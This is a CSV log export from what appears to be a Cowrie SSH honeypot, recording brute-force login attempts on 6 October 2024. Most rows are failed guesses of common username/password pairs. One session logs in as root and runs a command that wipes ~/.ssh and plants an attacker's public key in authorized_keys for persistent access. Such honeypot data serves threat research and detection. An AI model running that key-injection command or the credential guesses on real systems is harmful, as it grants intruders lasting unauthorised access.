eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.kex,200.69.236.207,,,,7840ca234633,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T22:57:05.145886Z
cowrie.login.failed,200.69.236.207,,,,7840ca234633,,,,,login attempt [nagios/test] failed,localhost,2024-10-06T22:57:05.830409Z
cowrie.session.connect,181.55.188.218,43052,172.233.154.19,2222,dbacbb325361,ssh,,,,New connection: 181.55.188.218:43052 (172.233.154.19:2222) [session: dbacbb325361],localhost,2024-10-06T22:57:06.675477Z
cowrie.client.version,181.55.188.218,,,,dbacbb325361,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T22:57:06.689075Z
cowrie.client.kex,181.55.188.218,,,,dbacbb325361,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T22:57:06.827122Z
cowrie.session.closed,200.69.236.207,,,,7840ca234633,,,,,Connection lost after 2 seconds,localhost,2024-10-06T22:57:06.992483Z
cowrie.login.failed,181.55.188.218,,,,dbacbb325361,,,,,login attempt [mai/123456] failed,localhost,2024-10-06T22:57:07.344786Z
cowrie.session.closed,181.55.188.218,,,,dbacbb325361,,,,,Connection lost after 1 seconds,localhost,2024-10-06T22:57:08.464448Z
cowrie.session.connect,181.55.188.218,55352,172.233.154.19,2222,20d7d898059f,ssh,,,,New connection: 181.55.188.218:55352 (172.233.154.19:2222) [session: 20d7d898059f],localhost,2024-10-06T22:57:48.381138Z
cowrie.client.version,181.55.188.218,,,,20d7d898059f,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T22:57:48.388306Z
cowrie.client.kex,181.55.188.218,,,,20d7d898059f,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T22:57:48.500986Z
cowrie.login.failed,181.55.188.218,,,,20d7d898059f,,,,,login attempt [user/Qwerty1] failed,localhost,2024-10-06T22:57:48.956963Z
cowrie.session.closed,181.55.188.218,,,,20d7d898059f,,,,,Connection lost after 1 seconds,localhost,2024-10-06T22:57:50.076596Z
cowrie.session.connect,200.69.236.207,51875,172.233.154.19,2222,70ebed548394,ssh,,,,New connection: 200.69.236.207:51875 (172.233.154.19:2222) [session: 70ebed548394],localhost,2024-10-06T22:57:51.631886Z
cowrie.client.version,200.69.236.207,,,,70ebed548394,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T22:57:51.632610Z
cowrie.client.kex,200.69.236.207,,,,70ebed548394,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T22:57:51.819213Z
cowrie.login.failed,200.69.236.207,,,,70ebed548394,,,,,login attempt [user/userpassword] failed,localhost,2024-10-06T22:57:52.606560Z
cowrie.session.closed,200.69.236.207,,,,70ebed548394,,,,,Connection lost after 2 seconds,localhost,2024-10-06T22:57:53.795522Z
cowrie.session.connect,181.55.188.218,39420,172.233.154.19,2222,e037299966d8,ssh,,,,New connection: 181.55.188.218:39420 (172.233.154.19:2222) [session: e037299966d8],localhost,2024-10-06T22:58:30.449617Z
cowrie.client.version,181.55.188.218,,,,e037299966d8,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T22:58:30.454792Z
cowrie.client.kex,181.55.188.218,,,,e037299966d8,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T22:58:30.583387Z
cowrie.login.failed,181.55.188.218,,,,e037299966d8,,,,,login attempt [xie/123456] failed,localhost,2024-10-06T22:58:31.094501Z
cowrie.session.closed,181.55.188.218,,,,e037299966d8,,,,,Connection lost after 1 seconds,localhost,2024-10-06T22:58:32.224217Z
cowrie.session.connect,200.69.236.207,58025,172.233.154.19,2222,3332651b8247,ssh,,,,New connection: 200.69.236.207:58025 (172.233.154.19:2222) [session: 3332651b8247],localhost,2024-10-06T22:58:36.673060Z
cowrie.client.version,200.69.236.207,,,,3332651b8247,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T22:58:36.673547Z
cowrie.client.kex,200.69.236.207,,,,3332651b8247,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T22:58:36.832220Z
cowrie.login.failed,200.69.236.207,,,,3332651b8247,,,,,login attempt [eio/123456] failed,localhost,2024-10-06T22:58:37.507958Z
cowrie.session.closed,200.69.236.207,,,,3332651b8247,,,,,Connection lost after 1 seconds,localhost,2024-10-06T22:58:38.669252Z
cowrie.session.connect,175.6.27.133,38822,172.233.154.19,2222,1fcb3b73eacc,ssh,,,,New connection: 175.6.27.133:38822 (172.233.154.19:2222) [session: 1fcb3b73eacc],localhost,2024-10-06T22:58:48.378711Z
cowrie.client.version,175.6.27.133,,,,1fcb3b73eacc,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T22:58:48.379556Z
cowrie.client.kex,175.6.27.133,,,,1fcb3b73eacc,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T22:58:48.540645Z
cowrie.login.failed,175.6.27.133,,,,1fcb3b73eacc,,,,,login attempt [ubuntu/ubuntupassword] failed,localhost,2024-10-06T22:58:49.224755Z
cowrie.session.closed,175.6.27.133,,,,1fcb3b73eacc,,,,,Connection lost after 2 seconds,localhost,2024-10-06T22:58:50.388000Z
cowrie.session.connect,181.55.188.218,51718,172.233.154.19,2222,0cfe63263ca6,ssh,,,,New connection: 181.55.188.218:51718 (172.233.154.19:2222) [session: 0cfe63263ca6],localhost,2024-10-06T22:59:14.292467Z
cowrie.client.version,181.55.188.218,,,,0cfe63263ca6,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T22:59:14.328894Z
cowrie.client.kex,181.55.188.218,,,,0cfe63263ca6,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T22:59:14.442116Z
cowrie.login.failed,181.55.188.218,,,,0cfe63263ca6,,,,,login attempt [testuser/test@123] failed,localhost,2024-10-06T22:59:14.928771Z
cowrie.session.closed,181.55.188.218,,,,0cfe63263ca6,,,,,Connection lost after 1 seconds,localhost,2024-10-06T22:59:16.043097Z
cowrie.session.connect,200.69.236.207,35942,172.233.154.19,2222,1358d2b4e263,ssh,,,,New connection: 200.69.236.207:35942 (172.233.154.19:2222) [session: 1358d2b4e263],localhost,2024-10-06T22:59:23.603191Z
cowrie.client.version,200.69.236.207,,,,1358d2b4e263,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T22:59:23.603739Z
cowrie.client.kex,200.69.236.207,,,,1358d2b4e263,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T22:59:23.762156Z
cowrie.login.failed,200.69.236.207,,,,1358d2b4e263,,,,,login attempt [dev/dev@2024] failed,localhost,2024-10-06T22:59:24.437193Z
cowrie.session.closed,200.69.236.207,,,,1358d2b4e263,,,,,Connection lost after 1 seconds,localhost,2024-10-06T22:59:25.598220Z
cowrie.session.connect,181.55.188.218,35792,172.233.154.19,2222,96350a3b0911,ssh,,,,New connection: 181.55.188.218:35792 (172.233.154.19:2222) [session: 96350a3b0911],localhost,2024-10-06T23:00:02.944082Z
cowrie.client.version,181.55.188.218,,,,96350a3b0911,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:00:02.957457Z
cowrie.client.kex,181.55.188.218,,,,96350a3b0911,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:00:03.087330Z
cowrie.login.failed,181.55.188.218,,,,96350a3b0911,,,,,login attempt [deploy/deploypassword] failed,localhost,2024-10-06T23:00:03.564531Z
cowrie.session.closed,181.55.188.218,,,,96350a3b0911,,,,,Connection lost after 1 seconds,localhost,2024-10-06T23:00:04.693371Z
cowrie.session.connect,200.69.236.207,42093,172.233.154.19,2222,40f616fb9108,ssh,,,,New connection: 200.69.236.207:42093 (172.233.154.19:2222) [session: 40f616fb9108],localhost,2024-10-06T23:00:10.899181Z
cowrie.client.version,200.69.236.207,,,,40f616fb9108,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:00:10.899704Z
cowrie.client.kex,200.69.236.207,,,,40f616fb9108,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:00:11.090633Z
cowrie.login.failed,200.69.236.207,,,,40f616fb9108,,,,,login attempt [steam/steampassword] failed,localhost,2024-10-06T23:00:11.894432Z
cowrie.session.closed,200.69.236.207,,,,40f616fb9108,,,,,Connection lost after 2 seconds,localhost,2024-10-06T23:00:13.087093Z
cowrie.session.connect,47.234.143.55,59066,172.233.154.19,2222,7249d83eba6a,ssh,,,,New connection: 47.234.143.55:59066 (172.233.154.19:2222) [session: 7249d83eba6a],localhost,2024-10-06T23:00:37.857759Z
cowrie.client.version,47.234.143.55,,,,7249d83eba6a,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:00:37.933600Z
cowrie.client.kex,47.234.143.55,,,,7249d83eba6a,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:00:38.063562Z
cowrie.login.success,47.234.143.55,,,,7249d83eba6a,,,,,login attempt [root/rootpassword] succeeded,localhost,2024-10-06T23:00:38.988009Z
cowrie.session.params,47.234.143.55,,,,7249d83eba6a,,,,,[],localhost,2024-10-06T23:00:39.107886Z
cowrie.command.input,47.234.143.55,,,,7249d83eba6a,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-10-06T23:00:39.108250Z
cowrie.command.failed,47.234.143.55,,,,7249d83eba6a,,,,,Command not found: lockr -ia .ssh,localhost,2024-10-06T23:00:39.108903Z
cowrie.log.closed,47.234.143.55,,,,7249d83eba6a,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-10-06T23:00:39.249324Z
cowrie.session.params,47.234.143.55,,,,7249d83eba6a,,,,,[],localhost,2024-10-06T23:00:39.323101Z
cowrie.command.input,47.234.143.55,,,,7249d83eba6a,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-10-06T23:00:39.323473Z
cowrie.session.file_download,47.234.143.55,,,,7249d83eba6a,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-10-06T23:00:39.375968Z
cowrie.log.closed,47.234.143.55,,,,7249d83eba6a,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-10-06T23:00:39.376525Z
cowrie.session.connect,47.234.143.55,60068,172.233.154.19,2222,650edeacd11f,ssh,,,,New connection: 47.234.143.55:60068 (172.233.154.19:2222) [session: 650edeacd11f],localhost,2024-10-06T23:00:39.445619Z
cowrie.client.version,47.234.143.55,,,,650edeacd11f,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:00:39.446177Z
cowrie.client.kex,47.234.143.55,,,,650edeacd11f,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:00:39.496439Z
cowrie.login.failed,47.234.143.55,,,,650edeacd11f,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-10-06T23:00:39.754625Z
cowrie.session.closed,47.234.143.55,,,,650edeacd11f,,,,,Connection lost after 1 seconds,localhost,2024-10-06T23:00:40.807327Z
cowrie.session.connect,47.234.143.55,60304,172.233.154.19,2222,8bc50d05c460,ssh,,,,New connection: 47.234.143.55:60304 (172.233.154.19:2222) [session: 8bc50d05c460],localhost,2024-10-06T23:00:40.872022Z
cowrie.client.version,47.234.143.55,,,,8bc50d05c460,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:00:40.872672Z
cowrie.client.kex,47.234.143.55,,,,8bc50d05c460,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:00:40.931811Z
cowrie.login.success,47.234.143.55,,,,8bc50d05c460,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-10-06T23:00:41.184103Z
cowrie.session.closed,47.234.143.55,,,,8bc50d05c460,,,,,Connection lost after 0 seconds,localhost,2024-10-06T23:00:41.255729Z
cowrie.session.closed,47.234.143.55,,,,7249d83eba6a,,,,,Connection lost after 3 seconds,localhost,2024-10-06T23:00:41.263833Z
cowrie.session.connect,181.55.188.218,48094,172.233.154.19,2222,5213d3926fdc,ssh,,,,New connection: 181.55.188.218:48094 (172.233.154.19:2222) [session: 5213d3926fdc],localhost,2024-10-06T23:00:47.058717Z
cowrie.client.version,181.55.188.218,,,,5213d3926fdc,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:00:47.076055Z
cowrie.client.kex,181.55.188.218,,,,5213d3926fdc,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:00:47.216733Z
